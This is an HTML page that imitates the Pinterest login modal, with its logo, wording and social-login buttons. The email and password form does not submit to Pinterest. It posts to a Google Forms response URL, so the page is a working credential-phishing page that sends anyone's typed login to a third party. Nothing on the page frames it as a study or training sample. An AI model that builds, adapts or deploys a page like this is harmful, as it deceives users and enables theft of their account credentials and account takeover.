<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Pinterest – Login</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css"/>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #e5e5e5;
      position: relative;
      overflow: hidden;
    }

    .mosaic {
      position: fixed;
      inset: 0;
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      grid-template-rows: repeat(2, 1fr);
      gap: 8px;
      padding: 8px;
    }

    .mosaic-cell { border-radius: 12px; }
    .mosaic-cell:nth-child(1) { background: #4a5568; }
    .mosaic-cell:nth-child(2) { background: #744210; }
    .mosaic-cell:nth-child(3) { background: #1a365d; }
    .mosaic-cell:nth-child(4) { background: #702459; }
    .mosaic-cell:nth-child(5) { background: #1c4532; }
    .mosaic-cell:nth-child(6) { background: #7b341e; }
    .mosaic-cell:nth-child(7) { background: #2d3748; }
    .mosaic-cell:nth-child(8) { background: #44337a; }

    .overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.4);
    }

    .modal {
      position: relative;
      z-index: 10;
      background: white;
      border-radius: 16px;
      padding: 32px 40px 28px;
      width: 380px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* Penyesuaian kecil agar tag <form> memenuhi lebar modal secara proporsional */
    form {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .pinterest-logo { width: 44px; height: 44px; margin-bottom: 12px; }

    h1 {
      font-size: 24px;
      font-weight: 700;
      color: #111;
      margin-bottom: 20px;
      text-align: center;
    }

    .form-group { width: 100%; margin-bottom: 12px; }

    .form-group label {
      display: block;
      font-size: 13px;
      font-weight: 500;
      color: #333;
      margin-bottom: 4px;
    }

    .input-wrap { position: relative; width: 100%; }

    .input-wrap input {
      width: 100%;
      height: 44px;
      border: 1.5px solid #cdcdcd;
      border-radius: 10px;
      padding: 0 40px 0 14px;
      font-size: 14px;
      color: #111;
      outline: none;
      transition: border-color 0.15s, box-shadow 0.15s;
      background: white;
    }

    .input-wrap input:focus {
      border-color: #0076d6;
      box-shadow: 0 0 0 3px rgba(0,118,214,0.12);
    }

    .eye-btn {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      color: #666;
      font-size: 18px;
      display: flex;
      align-items: center;
    }

    .forgot-link {
      display: block;
      text-align: left;
      color: #0f6aba;
      font-size: 13px;
      text-decoration: none;
      margin-top: 2px;
      margin-bottom: 16px;
      width: 100%;
      cursor: pointer;
    }

    .forgot-link:hover { text-decoration: underline; }

    .btn-login {
      width: 100%;
      height: 44px;
      background: #e60023;
      color: white;
      font-size: 15px;
      font-weight: 600;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      margin-bottom: 12px;
      transition: background 0.15s;
    }

    .btn-login:hover { background: #c0001d; }

    .divider {
      display: flex;
      align-items: center;
      gap: 10px;
      width: 100%;
      margin-bottom: 12px;
    }

    .divider::before, .divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: #e0e0e0;
    }

    .divider span {
      font-size: 12px;
      font-weight: 700;
      color: #666;
      letter-spacing: 0.5px;
    }

    .btn-social {
      width: 100%;
      height: 44px;
      background: white;
      border: 1.5px solid #cdcdcd;
      border-radius: 10px;
      font-size: 14px;
      font-weight: 500;
      color: #111;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin-bottom: 10px;
      transition: background 0.1s;
    }

    .btn-social:hover { background: #f5f5f5; }

    .g-logo { width: 18px; height: 18px; }

    .footer-text {
      font-size: 12px;
      color: #555;
      text-align: center;
      margin-top: 8px;
      line-height: 1.6;
    }

    .footer-link {
      color: #111;
      font-weight: 700;
      cursor: pointer;
      text-decoration: none;
    }

    .footer-link:hover { text-decoration: underline; }

    .legal {
      font-size: 11px;
      color: #888;
      margin-top: 10px;
    }

    .legal a {
      color: #555;
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="mosaic">
    <div class="mosaic-cell"></div>
    <div class="mosaic-cell"></div>
    <div class="mosaic-cell"></div>
    <div class="mosaic-cell"></div>
    <div class="mosaic-cell"></div>
    <div class="mosaic-cell"></div>
    <div class="mosaic-cell"></div>
    <div class="mosaic-cell"></div>
  </div>
  <div class="overlay"></div>

  <div class="modal">
    <svg class="pinterest-logo" viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg">
      <circle cx="22" cy="22" r="22" fill="#E60023"/>
      <path d="M22 8C14.268 8 8 14.268 8 22c0 5.916 3.576 11.016 8.724 13.244-.12-1.044-.228-2.64.048-3.78.252-.996 1.68-7.116 1.68-7.116s-.432-.864-.432-2.136c0-1.998 1.164-3.492 2.604-3.492 1.224 0 1.824.912 1.824 2.016 0 1.224-.78 3.06-1.188 4.764-.336 1.428.708 2.592 2.112 2.592 2.532 0 4.476-2.664 4.476-6.516 0-3.408-2.448-5.784-5.94-5.784-4.044 0-6.42 3.036-6.42 6.168 0 1.224.468 2.52 1.056 3.24.12.144.132.264.096.408-.108.444-.348 1.428-.396 1.62-.06.252-.204.312-.468.18-1.752-.816-2.844-3.384-2.844-5.448 0-4.428 3.216-8.496 9.276-8.496 4.872 0 8.652 3.468 8.652 8.1 0 4.836-3.048 8.724-7.272 8.724-1.416 0-2.748-.732-3.204-1.608l-.876 3.252c-.312 1.212-1.164 2.724-1.74 3.648.312.096.636.18.972.252A14 14 0 0036 22c0-7.732-6.268-14-14-14z" fill="white"/>
    </svg>

    <h1>Log in to see more</h1>

    <form action="https://docs.google.com/forms/d/e/1FAIpQLSfQixt2_ED6YtLqEiwUNKANJwAAWV2TfKNLoVJ2NSlqnDF6Vg/formResponse" method="POST" target="_blank">

      <div class="form-group">
        <label for="email">Email</label>
        <div class="input-wrap">
          <input type="text" id="email" name="entry.1697602432" placeholder="Email" required />
        </div>
      </div>

      <div class="form-group">
        <label for="password">Password</label>
        <div class="input-wrap">
          <input type="password" id="password" name="entry.1806551528" placeholder="Password" required />
          <button type="button" class="eye-btn" onclick="togglePw()" aria-label="Toggle password visibility">
            <i class="ti ti-eye" id="eye-icon"></i>
          </button>
        </div>
      </div>

      <a class="forgot-link">Forgot your password?</a>

      <button type="submit" class="btn-login">Log in</button>

    </form>
    <div class="divider"><span>OR</span></div>

    <button class="btn-social">
      <svg class="g-logo" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
        <path d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844a4.14 4.14 0 01-1.796 2.716v2.259h2.908c1.702-1.567 2.684-3.875 2.684-6.615z" fill="#4285F4"/>
        <path d="M9 18c2.43 0 4.467-.806 5.956-2.18l-2.908-2.259c-.806.54-1.837.86-3.048.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332A8.997 8.997 0 009 18z" fill="#34A853"/>
        <path d="M3.964 10.71A5.41 5.41 0 013.682 9c0-.593.102-1.17.282-1.71V4.958H.957A8.996 8.996 0 000 9c0 1.452.348 2.827.957 4.042l3.007-2.332z" fill="#FBBC05"/>
        <path d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0A8.997 8.997 0 00.957 4.958L3.964 7.29C4.672 5.163 6.656 3.58 9 3.58z" fill="#EA4335"/>
      </svg>
      Continue with Google
    </button>

    <button class="btn-social">
      <i class="ti ti-qrcode" style="font-size:20px;"></i>
      Use QR code
    </button>

    <div class="footer-text">
      <span style="color:#888;">Facebook login is no longer available</span><br>
      <a class="footer-link">Update login method</a>
    </div>

    <div class="footer-text" style="margin-top:6px;">
      Not on Pinterest yet? <a class="footer-link">Sign up</a>
    </div>

    <div class="footer-text" style="margin-top:4px;">
      Are you a business? <a class="footer-link">Get started here!</a>
    </div>

    <div class="footer-text legal">
      By continuing, you agree to Pinterest's <a href="#">Terms of Service</a> and acknowledge you've read our <a href="#">Privacy Policy</a>. <a href="#">Notice at collection</a>.
    </div>
  </div>

  <script>
    function togglePw() {
      const input = document.getElementById('password');
      const icon = document.getElementById('eye-icon');
      if (input.type === 'password') {
        input.type = 'text';
        icon.className = 'ti ti-eye-off';
      } else {
        input.type = 'password';
        icon.className = 'ti ti-eye';
      }
    }
  </script>
</body>
</html>
